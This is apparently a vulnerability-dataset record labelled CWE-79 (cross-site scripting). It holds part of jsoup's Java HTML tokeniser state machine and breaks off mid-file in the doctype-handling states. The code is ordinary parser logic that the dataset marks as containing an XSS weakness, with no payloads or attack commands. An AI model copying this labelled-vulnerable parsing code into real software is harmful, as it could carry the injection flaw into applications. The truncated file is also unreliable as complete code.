[
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "package org.jsoup.parser;\n\nimport java.util.Arrays;\n\n/**\n * States and transition activations for the Tokeniser.\n */\nenum TokeniserState {\n    Data {\n        // in data state, gather characters until a character reference or tag is found\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.current()) {\n                case '&':\n                    t.advanceTransition(CharacterReferenceInData);\n                    break;\n                case '<':\n                    t.advanceTransition(TagOpen);\n                    break;\n                case nullChar:\n                    t.error(this); // NOT replacement character (oddly?)\n                    t.emit(r.consume());\n                    break;\n                case eof:\n                    t.emit(new Token.EOF());\n                    break;\n                default:\n                    String data = r.consumeData();\n                    t.emit(data);\n                    break;\n            }\n        }\n    },\n    CharacterReferenceInData {\n        // from & in data\n        void read(Tokeniser t, CharacterReader r) {\n            char[] c = t.consumeCharacterReference(null, false);\n            if (c == null)\n                t.emit('&');\n            else\n                t.emit(c);\n            t.transition(Data);\n        }\n    },\n    Rcdata {\n        /// handles data in title, textarea etc\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.current()) {\n                case '&':\n                    t.advanceTransition(CharacterReferenceInRcdata);\n                    break;\n                case '<':\n                    t.advanceTransition(RcdataLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.emit(replacementChar);\n                    break;\n                case eof:\n                    t.emit(new Token.EOF());\n                    break;\n                default:\n                    String data = r.consumeToAny('&', '<', nullChar);\n                    t.emit(data);\n                    break;\n            }\n        }\n    },\n    CharacterReferenceInRcdata {\n        void read(Tokeniser t, CharacterReader r) {\n            char[] c = t.consumeCharacterReference(null, false);\n            if (c == null)\n                t.emit('&');\n            else\n                t.emit(c);\n            t.transition(Rcdata);\n        }\n    },\n    Rawtext {\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.current()) {\n                case '<':\n                    t.advanceTransition(RawtextLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.emit(replacementChar);\n                    break;\n                case eof:\n                    t.emit(new Token.EOF());\n                    break;\n                default:\n                    String data = r.consumeToAny('<', nullChar);\n                    t.emit(data);\n                    break;\n            }\n        }\n    },\n    ScriptData {\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.current()) {\n                case '<':\n                    t.advanceTransition(ScriptDataLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.emit(replacementChar);\n                    break;\n                case eof:\n                    t.emit(new Token.EOF());\n                    break;\n                default:\n                    String data = r.consumeToAny('<', nullChar);\n                    t.emit(data);\n                    break;\n            }\n        }\n    },\n    PLAINTEXT {\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.current()) {\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.emit(replacementChar);\n                    break;\n                case eof:\n                    t.emit(new Token.EOF());\n                    break;\n                default:\n                    String data = r.consumeTo(nullChar);\n                    t.emit(data);\n                    break;\n            }\n        }\n    },\n    TagOpen {\n        // from < in data\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.current()) {\n                case '!':\n                    t.advanceTransition(MarkupDeclarationOpen);\n                    break;\n                case '/':\n                    t.advanceTransition(EndTagOpen);\n                    break;\n                case '?':\n                    t.advanceTransition(BogusComment);\n                    break;\n                default:\n                    if (r.matchesLetter()) {\n                        t.createTagPending(true);\n                        t.transition(TagName);\n                    } else {\n                        t.error(this);\n                        t.emit('<'); // char that got us here\n                        t.transition(Data);\n                    }\n                    break;\n            }\n        }\n    },\n    EndTagOpen {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.isEmpty()) {\n                t.eofError(this);\n                t.emit(\"</\");\n                t.transition(Data);\n            } else if (r.matchesLetter()) {\n                t.createTagPending(false);\n                t.transition(TagName);\n            } else if (r.matches('>')) {\n                t.error(this);\n                t.advanceTransition(Data);\n            } else {\n                t.error(this);\n                t.advanceTransition(BogusComment);\n            }\n        }\n    },\n    TagName {\n        // from < or </ in data, will have start or end tag pending\n        void read(Tokeniser t, CharacterReader r) {\n            // previous TagOpen state did NOT consume, will have a letter char in current\n            //String tagName = r.consumeToAnySorted(tagCharsSorted).toLowerCase();\n            String tagName = r.consumeTagName().toLowerCase();\n            t.tagPending.appendTagName(tagName);\n\n            switch (r.consume()) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeAttributeName);\n                    break;\n                case '/':\n                    t.transition(SelfClosingStartTag);\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case nullChar: // replacement\n                    t.tagPending.appendTagName(replacementStr);\n                    break;\n                case eof: // should emit pending tag?\n                    t.eofError(this);\n                    t.transition(Data);\n                // no default, as covered with above consumeToAny\n            }\n        }\n    },\n    RcdataLessthanSign {\n        // from < in rcdata\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matches('/')) {\n                t.createTempBuffer();\n                t.advanceTransition(RCDATAEndTagOpen);\n            } else if (r.matchesLetter() && t.appropriateEndTagName() != null && !r.containsIgnoreCase(\"</\" + t.appropriateEndTagName())) {\n                // diverge from spec: got a start tag, but there's no appropriate end tag (</title>), so rather than\n                // consuming to EOF; break out here\n                t.tagPending = t.createTagPending(false).name(t.appropriateEndTagName());\n                t.emitTagPending();\n                r.unconsume(); // undo \"<\"\n                t.transition(Data);\n            } else {\n                t.emit(\"<\");\n                t.transition(Rcdata);\n            }\n        }\n    },\n    RCDATAEndTagOpen {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                t.createTagPending(false);\n                t.tagPending.appendTagName(Character.toLowerCase(r.current()));\n                t.dataBuffer.append(Character.toLowerCase(r.current()));\n                t.advanceTransition(RCDATAEndTagName);\n            } else {\n                t.emit(\"</\");\n                t.transition(Rcdata);\n            }\n        }\n    },\n    RCDATAEndTagName {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                String name = r.consumeLetterSequence();\n                t.tagPending.appendTagName(name.toLowerCase());\n                t.dataBuffer.append(name);\n                return;\n            }\n\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    if (t.isAppropriateEndTagToken())\n                        t.transition(BeforeAttributeName);\n                    else\n                        anythingElse(t, r);\n                    break;\n                case '/':\n                    if (t.isAppropriateEndTagToken())\n                        t.transition(SelfClosingStartTag);\n                    else\n                        anythingElse(t, r);\n                    break;\n                case '>':\n                    if (t.isAppropriateEndTagToken()) {\n                        t.emitTagPending();\n                        t.transition(Data);\n                    }\n                    else\n                        anythingElse(t, r);\n                    break;\n                default:\n                    anythingElse(t, r);\n            }\n        }\n\n        private void anythingElse(Tokeniser t, CharacterReader r) {\n            t.emit(\"</\" + t.dataBuffer.toString());\n            r.unconsume();\n            t.transition(Rcdata);\n        }\n    },\n    RawtextLessthanSign {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matches('/')) {\n                t.createTempBuffer();\n                t.advanceTransition(RawtextEndTagOpen);\n            } else {\n                t.emit('<');\n                t.transition(Rawtext);\n            }\n        }\n    },\n    RawtextEndTagOpen {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                t.createTagPending(false);\n                t.transition(RawtextEndTagName);\n            } else {\n                t.emit(\"</\");\n                t.transition(Rawtext);\n            }\n        }\n    },\n    RawtextEndTagName {\n        void read(Tokeniser t, CharacterReader r) {\n            handleDataEndTag(t, r, Rawtext);\n        }\n    },\n    ScriptDataLessthanSign {\n        void read(Tokeniser t, CharacterReader r) {\n            switch (r.consume()) {\n                case '/':\n                    t.createTempBuffer();\n                    t.transition(ScriptDataEndTagOpen);\n                    break;\n                case '!':\n                    t.emit(\"<!\");\n                    t.transition(ScriptDataEscapeStart);\n                    break;\n                default:\n                    t.emit(\"<\");\n                    r.unconsume();\n                    t.transition(ScriptData);\n            }\n        }\n    },\n    ScriptDataEndTagOpen {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                t.createTagPending(false);\n                t.transition(ScriptDataEndTagName);\n            } else {\n                t.emit(\"</\");\n                t.transition(ScriptData);\n            }\n\n        }\n    },\n    ScriptDataEndTagName {\n        void read(Tokeniser t, CharacterReader r) {\n            handleDataEndTag(t, r, ScriptData);\n        }\n    },\n    ScriptDataEscapeStart {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matches('-')) {\n                t.emit('-');\n                t.advanceTransition(ScriptDataEscapeStartDash);\n            } else {\n                t.transition(ScriptData);\n            }\n        }\n    },\n    ScriptDataEscapeStartDash {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matches('-')) {\n                t.emit('-');\n                t.advanceTransition(ScriptDataEscapedDashDash);\n            } else {\n                t.transition(ScriptData);\n            }\n        }\n    },\n    ScriptDataEscaped {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.isEmpty()) {\n                t.eofError(this);\n                t.transition(Data);\n                return;\n            }\n\n            switch (r.current()) {\n                case '-':\n                    t.emit('-');\n                    t.advanceTransition(ScriptDataEscapedDash);\n                    break;\n                case '<':\n                    t.advanceTransition(ScriptDataEscapedLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.emit(replacementChar);\n                    break;\n                default:\n                    String data = r.consumeToAny('-', '<', nullChar);\n                    t.emit(data);\n            }\n        }\n    },\n    ScriptDataEscapedDash {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.isEmpty()) {\n                t.eofError(this);\n                t.transition(Data);\n                return;\n            }\n\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.emit(c);\n                    t.transition(ScriptDataEscapedDashDash);\n                    break;\n                case '<':\n                    t.transition(ScriptDataEscapedLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.emit(replacementChar);\n                    t.transition(ScriptDataEscaped);\n                    break;\n                default:\n                    t.emit(c);\n                    t.transition(ScriptDataEscaped);\n            }\n        }\n    },\n    ScriptDataEscapedDashDash {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.isEmpty()) {\n                t.eofError(this);\n                t.transition(Data);\n                return;\n            }\n\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.emit(c);\n                    break;\n                case '<':\n                    t.transition(ScriptDataEscapedLessthanSign);\n                    break;\n                case '>':\n                    t.emit(c);\n                    t.transition(ScriptData);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.emit(replacementChar);\n                    t.transition(ScriptDataEscaped);\n                    break;\n                default:\n                    t.emit(c);\n                    t.transition(ScriptDataEscaped);\n            }\n        }\n    },\n    ScriptDataEscapedLessthanSign {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                t.createTempBuffer();\n                t.dataBuffer.append(Character.toLowerCase(r.current()));\n                t.emit(\"<\" + r.current());\n                t.advanceTransition(ScriptDataDoubleEscapeStart);\n            } else if (r.matches('/')) {\n                t.createTempBuffer();\n                t.advanceTransition(ScriptDataEscapedEndTagOpen);\n            } else {\n                t.emit('<');\n                t.transition(ScriptDataEscaped);\n            }\n        }\n    },\n    ScriptDataEscapedEndTagOpen {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                t.createTagPending(false);\n                t.tagPending.appendTagName(Character.toLowerCase(r.current()));\n                t.dataBuffer.append(r.current());\n                t.advanceTransition(ScriptDataEscapedEndTagName);\n            } else {\n                t.emit(\"</\");\n                t.transition(ScriptDataEscaped);\n            }\n        }\n    },\n    ScriptDataEscapedEndTagName {\n        void read(Tokeniser t, CharacterReader r) {\n            handleDataEndTag(t, r, ScriptDataEscaped);\n        }\n    },\n    ScriptDataDoubleEscapeStart {\n        void read(Tokeniser t, CharacterReader r) {\n            handleDataDoubleEscapeTag(t, r, ScriptDataDoubleEscaped, ScriptDataEscaped);\n        }\n    },\n    ScriptDataDoubleEscaped {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.current();\n            switch (c) {\n                case '-':\n                    t.emit(c);\n                    t.advanceTransition(ScriptDataDoubleEscapedDash);\n                    break;\n                case '<':\n                    t.emit(c);\n                    t.advanceTransition(ScriptDataDoubleEscapedLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.emit(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                default:\n                    String data = r.consumeToAny('-', '<', nullChar);\n                    t.emit(data);\n            }\n        }\n    },\n    ScriptDataDoubleEscapedDash {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.emit(c);\n                    t.transition(ScriptDataDoubleEscapedDashDash);\n                    break;\n                case '<':\n                    t.emit(c);\n                    t.transition(ScriptDataDoubleEscapedLessthanSign);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.emit(replacementChar);\n                    t.transition(ScriptDataDoubleEscaped);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                default:\n                    t.emit(c);\n                    t.transition(ScriptDataDoubleEscaped);\n            }\n        }\n    },\n    ScriptDataDoubleEscapedDashDash {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.emit(c);\n                    break;\n                case '<':\n                    t.emit(c);\n                    t.transition(ScriptDataDoubleEscapedLessthanSign);\n                    break;\n                case '>':\n                    t.emit(c);\n                    t.transition(ScriptData);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.emit(replacementChar);\n                    t.transition(ScriptDataDoubleEscaped);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                default:\n                    t.emit(c);\n                    t.transition(ScriptDataDoubleEscaped);\n            }\n        }\n    },\n    ScriptDataDoubleEscapedLessthanSign {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matches('/')) {\n                t.emit('/');\n                t.createTempBuffer();\n                t.advanceTransition(ScriptDataDoubleEscapeEnd);\n            } else {\n                t.transition(ScriptDataDoubleEscaped);\n            }\n        }\n    },\n    ScriptDataDoubleEscapeEnd {\n        void read(Tokeniser t, CharacterReader r) {\n            handleDataDoubleEscapeTag(t,r, ScriptDataEscaped, ScriptDataDoubleEscaped);\n        }\n    },\n    BeforeAttributeName {\n        // from tagname <xxx\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    break; // ignore whitespace\n                case '/':\n                    t.transition(SelfClosingStartTag);\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.newAttribute();\n                    r.unconsume();\n                    t.transition(AttributeName);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                case '\"':\n                case '\\'':\n                case '<':\n                case '=':\n                    t.error(this);\n                    t.tagPending.newAttribute();\n                    t.tagPending.appendAttributeName(c);\n                    t.transition(AttributeName);\n                    break;\n                default: // A-Z, anything else\n                    t.tagPending.newAttribute();\n                    r.unconsume();\n                    t.transition(AttributeName);\n            }\n        }\n    },\n    AttributeName {\n        // from before attribute name\n        void read(Tokeniser t, CharacterReader r) {\n            String name = r.consumeToAnySorted(attributeNameCharsSorted);\n            t.tagPending.appendAttributeName(name.toLowerCase());\n\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(AfterAttributeName);\n                    break;\n                case '/':\n                    t.transition(SelfClosingStartTag);\n                    break;\n                case '=':\n                    t.transition(BeforeAttributeValue);\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.appendAttributeName(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                case '\"':\n                case '\\'':\n                case '<':\n                    t.error(this);\n                    t.tagPending.appendAttributeName(c);\n                // no default, as covered in consumeToAny\n            }\n        }\n    },\n    AfterAttributeName {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    // ignore\n                    break;\n                case '/':\n                    t.transition(SelfClosingStartTag);\n                    break;\n                case '=':\n                    t.transition(BeforeAttributeValue);\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.appendAttributeName(replacementChar);\n                    t.transition(AttributeName);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                case '\"':\n                case '\\'':\n                case '<':\n                    t.error(this);\n                    t.tagPending.newAttribute();\n                    t.tagPending.appendAttributeName(c);\n                    t.transition(AttributeName);\n                    break;\n                default: // A-Z, anything else\n                    t.tagPending.newAttribute();\n                    r.unconsume();\n                    t.transition(AttributeName);\n            }\n        }\n    },\n    BeforeAttributeValue {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    // ignore\n                    break;\n                case '\"':\n                    t.transition(AttributeValue_doubleQuoted);\n                    break;\n                case '&':\n                    r.unconsume();\n                    t.transition(AttributeValue_unquoted);\n                    break;\n                case '\\'':\n                    t.transition(AttributeValue_singleQuoted);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.appendAttributeValue(replacementChar);\n                    t.transition(AttributeValue_unquoted);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case '<':\n                case '=':\n                case '`':\n                    t.error(this);\n                    t.tagPending.appendAttributeValue(c);\n                    t.transition(AttributeValue_unquoted);\n                    break;\n                default:\n                    r.unconsume();\n                    t.transition(AttributeValue_unquoted);\n            }\n        }\n    },\n    AttributeValue_doubleQuoted {\n        void read(Tokeniser t, CharacterReader r) {\n            String value = r.consumeToAnySorted(attributeDoubleValueCharsSorted);\n            if (value.length() > 0)\n                t.tagPending.appendAttributeValue(value);\n\n            char c = r.consume();\n            switch (c) {\n                case '\"':\n                    t.transition(AfterAttributeValue_quoted);\n                    break;\n                case '&':\n                    char[] ref = t.consumeCharacterReference('\"', true);\n                    if (ref != null)\n                        t.tagPending.appendAttributeValue(ref);\n                    else\n                        t.tagPending.appendAttributeValue('&');\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.appendAttributeValue(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                // no default, handled in consume to any above\n            }\n        }\n    },\n    AttributeValue_singleQuoted {\n        void read(Tokeniser t, CharacterReader r) {\n            String value = r.consumeToAnySorted(attributeSingleValueCharsSorted);\n            if (value.length() > 0)\n                t.tagPending.appendAttributeValue(value);\n\n            char c = r.consume();\n            switch (c) {\n                case '\\'':\n                    t.transition(AfterAttributeValue_quoted);\n                    break;\n                case '&':\n                    char[] ref = t.consumeCharacterReference('\\'', true);\n                    if (ref != null)\n                        t.tagPending.appendAttributeValue(ref);\n                    else\n                        t.tagPending.appendAttributeValue('&');\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.appendAttributeValue(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                // no default, handled in consume to any above\n            }\n        }\n    },\n    AttributeValue_unquoted {\n        void read(Tokeniser t, CharacterReader r) {\n            String value = r.consumeToAny('\\t', '\\n', '\\r', '\\f', ' ', '&', '>', nullChar, '\"', '\\'', '<', '=', '`');\n            if (value.length() > 0)\n                t.tagPending.appendAttributeValue(value);\n\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeAttributeName);\n                    break;\n                case '&':\n                    char[] ref = t.consumeCharacterReference('>', true);\n                    if (ref != null)\n                        t.tagPending.appendAttributeValue(ref);\n                    else\n                        t.tagPending.appendAttributeValue('&');\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.appendAttributeValue(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                case '\"':\n                case '\\'':\n                case '<':\n                case '=':\n                case '`':\n                    t.error(this);\n                    t.tagPending.appendAttributeValue(c);\n                    break;\n                // no default, handled in consume to any above\n            }\n\n        }\n    },\n    // CharacterReferenceInAttributeValue state handled inline\n    AfterAttributeValue_quoted {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeAttributeName);\n                    break;\n                case '/':\n                    t.transition(SelfClosingStartTag);\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    r.unconsume();\n                    t.transition(BeforeAttributeName);\n            }\n\n        }\n    },\n    SelfClosingStartTag {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '>':\n                    t.tagPending.selfClosing = true;\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.transition(BeforeAttributeName);\n            }\n        }\n    },\n    BogusComment {\n        void read(Tokeniser t, CharacterReader r) {\n            // todo: handle bogus comment starting from eof. when does that trigger?\n            // rewind to capture character that lead us here\n            r.unconsume();\n            Token.Comment comment = new Token.Comment();\n            comment.bogus = true;\n            comment.data.append(r.consumeTo('>'));\n            // todo: replace nullChar with replaceChar\n            t.emit(comment);\n            t.advanceTransition(Data);\n        }\n    },\n    MarkupDeclarationOpen {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchConsume(\"--\")) {\n                t.createCommentPending();\n                t.transition(CommentStart);\n            } else if (r.matchConsumeIgnoreCase(\"DOCTYPE\")) {\n                t.transition(Doctype);\n            } else if (r.matchConsume(\"[CDATA[\")) {\n                // todo: should actually check current namepspace, and only non-html allows cdata. until namespace\n                // is implemented properly, keep handling as cdata\n                //} else if (!t.currentNodeInHtmlNS() && r.matchConsume(\"[CDATA[\")) {\n                t.transition(CdataSection);\n            } else {\n                t.error(this);\n                t.advanceTransition(BogusComment); // advance so this character gets in bogus comment data's rewind\n            }\n        }\n    },\n    CommentStart {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.transition(CommentStartDash);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.commentPending.data.append(replacementChar);\n                    t.transition(Comment);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.commentPending.data.append(c);\n                    t.transition(Comment);\n            }\n        }\n    },\n    CommentStartDash {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.transition(CommentStartDash);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.commentPending.data.append(replacementChar);\n                    t.transition(Comment);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.commentPending.data.append(c);\n                    t.transition(Comment);\n            }\n        }\n    },\n    Comment {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.current();\n            switch (c) {\n                case '-':\n                    t.advanceTransition(CommentEndDash);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.commentPending.data.append(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.commentPending.data.append(r.consumeToAny('-', nullChar));\n            }\n        }\n    },\n    CommentEndDash {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.transition(CommentEnd);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.commentPending.data.append('-').append(replacementChar);\n                    t.transition(Comment);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.commentPending.data.append('-').append(c);\n                    t.transition(Comment);\n            }\n        }\n    },\n    CommentEnd {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '>':\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.commentPending.data.append(\"--\").append(replacementChar);\n                    t.transition(Comment);\n                    break;\n                case '!':\n                    t.error(this);\n                    t.transition(CommentEndBang);\n                    break;\n                case '-':\n                    t.error(this);\n                    t.commentPending.data.append('-');\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.commentPending.data.append(\"--\").append(c);\n                    t.transition(Comment);\n            }\n        }\n    },\n    CommentEndBang {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.commentPending.data.append(\"--!\");\n                    t.transition(CommentEndDash);\n                    break;\n                case '>':\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.commentPending.data.append(\"--!\").append(replacementChar);\n                    t.transition(Comment);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.commentPending.data.append(\"--!\").append(c);\n                    t.transition(Comment);\n            }\n        }\n    },\n    Doctype {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeDoctypeName);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    // note: fall through to > case\n                case '>': // catch invalid <!DOCTYPE>\n                    t.error(this);\n                    t.createDoctypePending();\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.transition(BeforeDoctypeName);\n            }\n        }\n    },\n    BeforeDoctypeName {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                t.createDoctypePending();\n                t.transition(DoctypeName);\n                return;\n            }\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    break; // ignore whitespace\n                case nullChar:\n                    t.error(this);\n                    t.createDoctypePending();\n                    t.doctypePending.name.append(replacementChar);\n                    t.transition(DoctypeName);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.createDoctypePending();\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.createDoctypePending();\n                    t.doctypePending.name.append(c);\n                    t.transition(DoctypeName);\n            }\n        }\n    },\n    DoctypeName {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                String name = r.consumeLetterSequence();\n                t.doctypePending.name.append(name.toLowerCase());\n                return;\n            }\n            char c = r.consume();\n            switch (c) {\n                case '>':\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(AfterDoctypeName);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.doctypePending.name.append(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.doctypePending.name.append(c);\n            }\n        }\n    },\n    AfterDoctypeName {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.isEmpty()) {\n                t.eofError(this);\n                t.doctypePending.forceQuirks = true;\n                t.emitDoctypePending();\n                t.transition(Data);\n                return;\n            }\n            if (r.matchesAny('\\t', '\\n', '\\r', '\\f', ' '))\n                r.advance(); // ignore whitespace\n            else if (r.matches('>')) {\n                t.emitDoctypePending();\n                t.advanceTransition(Data);\n            } else if (r.matchConsumeIgnoreCase(\"PUBLIC\")) {\n                t.transition(AfterDoctypePublicKeyword);\n            } else if (r.matchConsumeIgnoreCase(\"SYSTEM\")) {\n                t.transition(AfterDoctypeSystemKeyword);\n            } else {\n                t.error(this);\n                t.doctypePending.forceQuirks = true;\n                t.advanceTransition(BogusDoctype);\n            }\n\n        }\n    },\n    AfterDoctypePublicKeyword {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeDoctypePublicIdentifier);\n                    break;\n                case '\"':\n                    t.error(this);\n                    // set public id to empty string\n                    t.transition(DoctypePublicIdentifier_doubleQuoted);\n                    break;\n                case '\\'':\n                    t.error(this);\n                    // set public id to empty string\n                    